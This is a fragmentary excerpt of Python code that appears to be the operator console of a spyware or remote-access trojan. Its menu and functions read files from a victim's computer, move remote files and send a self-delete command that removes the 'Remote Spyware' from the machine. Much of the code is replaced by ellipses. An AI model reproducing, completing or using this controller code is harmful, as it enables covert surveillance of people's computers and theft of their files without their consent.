...
def UsableCommands():
    ...
    print("[-ds] Delete Spyware Program           |")
    print("_______________________________________|\n")
...
def ReadFile():
    ...
    send("readfile"); sendall(filePath)
    if not (str(recvall(recv(BUFFER)), "utf-8") == "valid"):
        print("[!] Unable to find Remote File\n")
        return
    ...
    try:
        ...
        read_binary_file = input("\n<This is a binary file>\nDo you want to read anyways? (y/n): ").lower()
        if (read_binary_file == "y" or read_binary_file == "yes"):
            print(f"\n{fileContent}\n")
...
def MoveFile():
    ...
    filePath = input("\nSelect Remote File: ")
    remoteDirectory = input("\nNew Remote Directory Location: ")

    sendall(filePath)
    sendall(remoteDirectory)

    clientResponse = str(recvall(recv(BUFFER)), "utf-8")
    if (clientResponse == "invalid-file"):
        print("[!] Unable to find Remote File\n")
        return

    elif (clientResponse == "invalid-dir"):
        print("[!] Unable to find Remote Directory\n")
        return

    else: print("File Moved Successfully!\n")
    ...
    while (True):
        try:
            ...
            if (command == "help" or command == "?"):
                ...
                send("deleteself")
                print(f"Remote Spyware Deleted off Computer ~ [{clientInfo[0]}]\n")
                break
